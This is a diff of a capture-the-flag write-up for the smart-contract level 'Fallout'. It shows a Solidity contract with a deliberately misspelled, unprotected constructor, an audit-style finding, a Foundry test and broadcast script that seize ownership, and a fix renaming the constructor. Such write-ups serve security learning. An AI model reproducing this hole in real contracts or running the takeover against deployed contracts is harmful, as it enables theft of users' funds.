@@ -4,21 +4,120 @@
 
 **Description**:
 
-That was silly wasn't it? Real world contracts must be much more secure than this and so must it be much harder to hack them right?
+Claim ownership of the contract below to complete this level.
 
-Well... Not quite.
+Things that might help:
 
-The story of Rubixi is a very well known case in the Ethereum ecosystem. The company changed its name from 'Dynamic Pyramid' to 'Rubixi' but somehow they didn't rename the constructor method of its contract:
+- Solidity Remix IDE
+
+**Code**:
+
+The smart contract to be exploited:
+
+<details>
+<summary>See Code</summary>
 
 ```javascript
-contract Rubixi {
-  address private owner;
-  function DynamicPyramid() { owner = msg.sender; }
-  function collectAllFees() { owner.transfer(this.balance) }
-  ...
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+import "openzeppelin-contracts-06/math/SafeMath.sol";
+
+contract Fallout {
+    using SafeMath for uint256;
+
+    mapping(address => uint256) allocations;
+    address payable public owner;
+
+    /* constructor */
+    function Fal1out() public payable {
+        owner = msg.sender;
+        allocations[owner] = msg.value;
+    }
+
+    modifier onlyOwner() {
+        require(msg.sender == owner, "caller is not the owner");
+        _;
+    }
+
+    function allocate() public payable {
+        allocations[msg.sender] = allocations[msg.sender].add(msg.value);
+    }
+
+    function sendAllocation(address payable allocator) public {
+        require(allocations[allocator] > 0);
+        allocator.transfer(allocations[allocator]);
+    }
+
+    function collectAllocations() public onlyOwner {
+        msg.sender.transfer(address(this).balance);
+    }
+
+    function allocatorBalance(address allocator) public view returns (uint256) {
+        return allocations[allocator];
+    }
+}
 ```
 
-This allowed the attacker to call the old constructor and claim ownership of the contract, and steal some funds. Yep. Big mistakes can be made in smartcontractland.
+</details>
+
+# Findings
+
+### [H-1] Wrong constructor definition allow entrant to claim ownership easily
+
+**Description**: The constructor definition `Fallout::Fal1out` is incorrectly typed (`'Fal-1-out'`)... Since is incorrectly typed, it is treated as a simple function, and since this function does not have any protection, any address can execute it and be the owner of the contract.
+
+```javascript
+    /* constructor */
+@>  function Fal1out() public payable {
+      owner = msg.sender;
+      allocations[owner] = msg.value;
+    }
+```
+
+**Impact**: Anyone can claim contract ownership.
+
+**Proof of Code**:
+
+See the complete code in `FalloutAttack.t.sol`.
+
+```javascript
+function testShouldStealOwnership() public {
+  address attacker = vm.addr(1);
+  uint256 attackerBalance = 1 wei;
+  vm.deal(attacker, attackerBalance);
+
+  assertEq(fallout.owner(), address(0));
+
+  vm.prank(attacker);
+  fallout.Fal1out();
+
+  assertEq(fallout.owner(), attacker);
+}
+```
+
+**Recommended Mitigation**: Fix the constructor name:
+
+```diff
+-function Fal1out() public payable {
++function Fallout() public payable {
+    owner = msg.sender;
+    allocations[owner] = msg.value;
+}
+```
+
+# Attack
+
+**Description**: The attack followed the same strategy as the one tested in `FallbackAttack.t.sol`. This is a code snippet from `FallbackAttack.s.sol`:
+
+```javascript
+vm.startBroadcast(attacker);
+
+// Attack
+fallout.Fal1out();
+
+vm.stopBroadcast();
+```
 
 **Instance used**: [0x407d461AD2233b6c2Be251185f32E65D23bba754](https://sepolia.etherscan.io/address/0x407d461AD2233b6c2Be251185f32E65D23bba754)
 
